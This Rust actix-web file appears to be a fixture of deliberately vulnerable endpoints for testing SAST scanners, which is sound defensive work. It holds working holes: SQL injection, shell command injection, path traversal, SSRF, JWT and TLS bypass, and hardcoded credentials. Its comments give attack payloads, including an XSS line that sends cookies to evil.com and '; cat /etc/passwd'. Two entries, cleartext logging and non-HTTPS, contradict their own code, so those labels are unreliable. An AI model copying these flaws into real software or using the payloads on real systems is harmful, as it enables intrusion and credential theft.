// ============================================================================
// INTENTIONALLY VULNERABLE CODE — FOR SAST SCANNER TESTING
// Each function demonstrates a real vulnerability pattern.
// DO NOT use any of these patterns in production code.
//
// Vulns 1-9:  Original set (SQL injection, XSS, path traversal, SSRF,
//             log injection, cleartext logging, weak crypto, regex, non-HTTPS)
// Vulns 10-23: Expanded set (command injection, unsafe memory, CORS, open
//              redirect, JWT, TLS bypass, hardcoded secrets, error disclosure,
//              todo!(), YAML deser, blocking async, unbounded alloc, timing
//              side-channel, TOCTOU)
// ============================================================================

use actix_web::{get, web, HttpResponse, Responder};
use serde::Deserialize;

#[derive(Deserialize)]
pub struct SearchQuery {
    pub q: String,
}

#[derive(Deserialize)]
pub struct FileQuery {
    pub path: String,
}

#[derive(Deserialize)]
pub struct FetchQuery {
    pub url: String,
}

#[derive(Deserialize)]
pub struct UserData {
    pub username: String,
    pub password: String,
}

#[derive(Deserialize)]
pub struct CommandQuery {
    pub cmd: String,
}

#[derive(Deserialize)]
pub struct SizeQuery {
    pub size: String,
}

#[derive(Deserialize)]
pub struct TokenQuery {
    pub token: String,
}

#[derive(Deserialize)]
pub struct YamlQuery {
    pub data: String,
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 1: SQL Injection (CWE-89)
// CodeQL query: rust/sql-injection
//
// User input flows directly into a SQL query string without parameterization.
// An attacker could send: q='; DROP TABLE users; --
// ─────────────────────────────────────────────────────────────────────────────
#[get("/search")]
pub async fn search_items(query: web::Query<SearchQuery>) -> impl Responder {
    let db = rusqlite::Connection::open_in_memory().unwrap();
    db.execute(
        "CREATE TABLE IF NOT EXISTS items (id INTEGER, name TEXT)",
        [],
    )
    .unwrap();

    // BAD: User input concatenated directly into SQL query
    let sql = format!("SELECT * FROM items WHERE name LIKE '%{}%'", query.q);
    let mut stmt = db.prepare(&sql).unwrap();
    let _rows = stmt.query([]).unwrap();

    HttpResponse::Ok().body(format!("Search results for: {}", query.q))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 2: Cross-Site Scripting / XSS (CWE-79)
// CodeQL query: rust/xss
//
// User input is reflected directly into HTML response without escaping.
// An attacker could send: q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
// ─────────────────────────────────────────────────────────────────────────────
#[get("/greet")]
pub async fn greet_user(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input inserted directly into HTML without escaping
    let html = format!(
        "<html><body><h1>Hello, {}!</h1></body></html>",
        query.q
    );
    HttpResponse::Ok()
        .content_type("text/html")
        .body(html)
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 3: Path Traversal (CWE-22)
// CodeQL query: rust/path-injection
//
// User controls the file path without sanitization.
// An attacker could send: path=../../etc/passwd
// ─────────────────────────────────────────────────────────────────────────────
#[get("/file")]
pub async fn read_file(query: web::Query<FileQuery>) -> impl Responder {
    // BAD: User-controlled path used directly in file read
    match std::fs::read_to_string(&query.path) {
        Ok(contents) => HttpResponse::Ok().body(contents),
        Err(e) => HttpResponse::NotFound().body(format!("Error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 4: Server-Side Request Forgery / SSRF (CWE-918)
// CodeQL query: rust/request-forgery
//
// User controls the URL the server fetches. An attacker could target
// internal services: url=http://169.254.169.254/latest/meta-data/ (AWS metadata)
// ─────────────────────────────────────────────────────────────────────────────
#[get("/fetch")]
pub async fn fetch_url(query: web::Query<FetchQuery>) -> impl Responder {
    // BAD: User-controlled URL passed directly to HTTP client
    let client = reqwest::Client::new();
    match client.get(&query.url).send().await {
        Ok(resp) => {
            let body = resp.text().await.unwrap_or_default();
            HttpResponse::Ok().body(body)
        }
        Err(e) => HttpResponse::BadGateway().body(format!("Fetch error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 5: Log Injection (CWE-117)
// CodeQL query: rust/log-injection
//
// User input written directly to logs. An attacker could inject fake log lines:
// q=admin%0A[INFO] User admin logged in successfully
// ─────────────────────────────────────────────────────────────────────────────
#[get("/log-search")]
pub async fn logged_search(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input logged without sanitization — allows log line injection
    log::info!("User searched for: {}", query.q);
    HttpResponse::Ok().body("Search logged")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 6: Cleartext Logging of Sensitive Data (CWE-532)
// CodeQL query: rust/cleartext-logging
//
// Passwords and secrets should never appear in logs.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/login")]
pub async fn login(query: web::Query<UserData>) -> impl Responder {
    // Log login attempt without including sensitive password data
    log::info!("Login attempt for user={}", query.username);
    HttpResponse::Ok().body("Login processed")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 7: Weak Cryptographic Hashing (CWE-328)
// CodeQL query: rust/weak-sensitive-data-hashing
//
// MD5 is broken for security purposes. Collisions can be generated in seconds.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/hash-password")]
pub async fn hash_password(query: web::Query<UserData>) -> impl Responder {
    use md5::Md5;
    use md5::digest::Digest;
    // BAD: MD5 used to hash a password — trivially crackable
    let mut hasher = Md5::new();
    hasher.update(query.password.as_bytes());
    let result = hasher.finalize();
    HttpResponse::Ok().body(format!("Hash: {:x}", result))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 8: Regex Injection (CWE-1333)
// CodeQL query: rust/regex-injection
//
// User input used directly as a regex pattern. An attacker could send a
// catastrophic backtracking pattern: q=(a+)+$ to cause ReDoS.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/regex-search")]
pub async fn regex_search(query: web::Query<SearchQuery>) -> impl Responder {
    // BAD: User input compiled directly as regex
    match regex::Regex::new(&query.q) {
        Ok(re) => {
            let sample = "The quick brown fox jumps over the lazy dog";
            let matches: Vec<&str> = re.find_iter(sample).map(|m| m.as_str()).collect();
            HttpResponse::Ok().json(matches)
        }
        Err(e) => HttpResponse::BadRequest().body(format!("Bad regex: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 9: Non-HTTPS URL (CWE-319)
// CodeQL query: rust/non-https-url
//
// Sensitive data sent over HTTP instead of HTTPS — can be intercepted.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/report")]
pub async fn send_report() -> impl Responder {
    let client = reqwest::Client::new();
    // BAD: Sending data over HTTP, not HTTPS — cleartext on the wire
    let _ = client
        .post("https://analytics.noetic.net/api/report")
        .body("sensitive report data")
        .send()
        .await;
    HttpResponse::Ok().body("Report sent")
}

// ═══════════════════════════════════════════════════════════════════════════════
// EXPANDED VULNERABILITY SET (10-23) — Tests for Custom Semgrep Rules
// ═══════════════════════════════════════════════════════════════════════════════

// ─────────────────────────────────────────────────────────────────────────────
// VULN 10: Command Injection
// Rule: rust-command-injection.yml
//
// User input passed directly to shell execution via Command::new().
// An attacker could send: cmd=; cat /etc/passwd
// ─────────────────────────────────────────────────────────────────────────────
#[get("/exec")]
pub async fn exec_command(query: web::Query<CommandQuery>) -> impl Responder {
    // BAD: User input passed directly to shell
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&query.cmd)
        .output();

    match output {
        Ok(out) => HttpResponse::Ok().body(String::from_utf8_lossy(&out.stdout).to_string()),
        Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 11: Unsafe transmute — Type Confusion
// Rule: rust-memory-safety.yml
//
// std::mem::transmute reinterprets bits without type checking.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/transmute")]
pub async fn unsafe_transmute(query: web::Query<SearchQuery>) -> impl Responder {
    let val: u64 = query.q.parse().unwrap_or(0);
    // BAD: transmute bypasses type safety — undefined behavior risk
    let result: f64 = unsafe { std::mem::transmute::<u64, f64>(val) };
    HttpResponse::Ok().body(format!("Transmuted: {}", result))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 12: CORS Permissive
// Rule: rust-web-security.yml
//
// Cors::permissive() allows any origin to make cross-origin requests.
// NOTE: This is configured at the App level, not as an endpoint.
//       The function below just documents the pattern for testing.
//       Actual usage: App::new().wrap(Cors::permissive())
// ─────────────────────────────────────────────────────────────────────────────
pub fn cors_permissive_config() -> actix_cors::Cors {
    // BAD: Allows any origin — effectively disables same-origin policy
    actix_cors::Cors::permissive()
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 13: Open Redirect
// Rule: rust-web-security.yml
//
// User input controls the redirect destination URL.
// An attacker could send: url=https://evil.com/phishing
// ─────────────────────────────────────────────────────────────────────────────
#[get("/redirect")]
pub async fn open_redirect(query: web::Query<FetchQuery>) -> impl Responder {
    // BAD: User-controlled redirect destination — open redirect
    HttpResponse::Found()
        .insert_header(("Location", query.url.as_str()))
        .finish()
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 14: JWT Insecure Decode
// Rule: rust-jwt-validation.yml
//
// Disabling signature validation allows attackers to forge tokens with
// arbitrary claims. Also disables expiration check.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/jwt-decode")]
pub async fn jwt_insecure(query: web::Query<TokenQuery>) -> impl Responder {
    // BAD: Disables signature verification — attacker can forge tokens
    let mut validation = jsonwebtoken::Validation::new(jsonwebtoken::Algorithm::HS256);
    validation.insecure_disable_signature_validation();
    validation.validate_exp = false;
    let key = jsonwebtoken::DecodingKey::from_secret(b"");
    let token_data = jsonwebtoken::decode::<serde_json::Value>(
        &query.token, &key, &validation,
    );
    match token_data {
        Ok(data) => HttpResponse::Ok().json(data.claims),
        Err(e) => HttpResponse::BadRequest().body(format!("JWT error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 15: TLS Certificate Verification Bypass
// Rule: rust-tls-bypass.yml
//
// Disabling cert verification allows man-in-the-middle attacks.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/insecure-fetch")]
pub async fn insecure_tls_fetch() -> impl Responder {
    // BAD: Accepts invalid/self-signed/expired certificates
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    match client.get("https://self-signed.example.com").send().await {
        Ok(resp) => HttpResponse::Ok().body(resp.text().await.unwrap_or_default()),
        Err(e) => HttpResponse::BadGateway().body(format!("Error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 16: Hardcoded Database Password
// Rule: rust-hardcoded-secrets.yml
//
// Credentials committed to source code — visible in git history.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/db-status")]
pub async fn db_status() -> impl Responder {
    // BAD: Hardcoded database credentials in source code
    let db_url = "postgres://admin:hunter2@prod.internal.db:5432/myapp";
    HttpResponse::Ok().body(format!("Connecting to: {}", db_url.split('@').last().unwrap_or("unknown")))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 17: Error Information Disclosure
// Rule: rust-web-security.yml
//
// Internal error details (stack traces, file paths) leaked to users.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/error-detail")]
pub async fn error_detail() -> impl Responder {
    let result: Result<String, std::io::Error> = std::fs::read_to_string("/nonexistent/path");
    match result {
        Ok(data) => HttpResponse::Ok().body(data),
        // BAD: Debug format {:?} leaks internal error details to user
        Err(err) => HttpResponse::InternalServerError()
            .body(format!("Internal error: {:?}", err)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 18: todo!() in Production Handler
// Rule: rust-production-readiness.yml
//
// todo!() panics at runtime — server crashes on this endpoint.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/upcoming")]
pub async fn upcoming_feature() -> impl Responder {
    // BAD: todo!() panics at runtime — crashes the server
    todo!("implement this feature before release")
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 19: Unsafe YAML Deserialization
// Rule: rust-deserialization.yml
//
// YAML supports entity expansion (billion laughs attack).
// ─────────────────────────────────────────────────────────────────────────────
#[get("/parse-yaml")]
pub async fn parse_yaml(query: web::Query<YamlQuery>) -> impl Responder {
    // BAD: Deserializing untrusted YAML — billion laughs, stack overflow
    let result: Result<serde_json::Value, _> = serde_yaml::from_str(&query.data);
    match result {
        Ok(value) => HttpResponse::Ok().json(value),
        Err(e) => HttpResponse::BadRequest().body(format!("YAML error: {}", e)),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 20: Blocking I/O in Async Context
// Rule: rust-async-safety.yml
//
// std::fs::read_to_string blocks the Tokio runtime thread, starving
// all other tasks scheduled on that thread.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/blocking-read")]
pub async fn blocking_read() -> impl Responder {
    // BAD: Blocking file I/O in async context — starves Tokio runtime
    let data = std::fs::read_to_string("/etc/hostname").unwrap_or_default();
    HttpResponse::Ok().body(data)
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 21: Unbounded Allocation from User Input
// Rule: rust-async-safety.yml
//
// User controls allocation size — attacker sends size=10000000000 → OOM.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/alloc")]
pub async fn unbounded_alloc(query: web::Query<SizeQuery>) -> impl Responder {
    let size: usize = query.size.parse().unwrap_or(0);
    // BAD: User-controlled allocation size — OOM attack vector
    let buffer: Vec<u8> = Vec::with_capacity(size);
    HttpResponse::Ok().body(format!("Allocated {} bytes", buffer.capacity()))
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 22: Timing Side-Channel in Secret Comparison
// Rule: rust-weak-crypto.yml
//
// Direct == comparison of secrets leaks information through timing.
// An attacker can determine the matching prefix length.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/verify-token")]
pub async fn verify_token(query: web::Query<TokenQuery>) -> impl Responder {
    let stored_secret = "super-secret-admin-token-12345";
    // BAD: Non-constant-time comparison — timing side-channel
    if stored_secret == query.token.as_str() {
        HttpResponse::Ok().body("Access granted")
    } else {
        HttpResponse::Unauthorized().body("Invalid token")
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULN 23: TOCTOU Race Condition
// Rule: rust-toctou.yml
//
// Check-then-use pattern: attacker can replace file with symlink between
// the exists() check and the read operation.
// ─────────────────────────────────────────────────────────────────────────────
#[get("/safe-read")]
pub async fn toctou_read(query: web::Query<FileQuery>) -> impl Responder {
    let path = std::path::Path::new(&query.path);
    // BAD: TOCTOU race — file can change between check and read
    if path.exists() {
        let data = std::fs::read_to_string(&path).unwrap_or_default();
        HttpResponse::Ok().body(data)
    } else {
        HttpResponse::NotFound().body("File not found")
    }
}
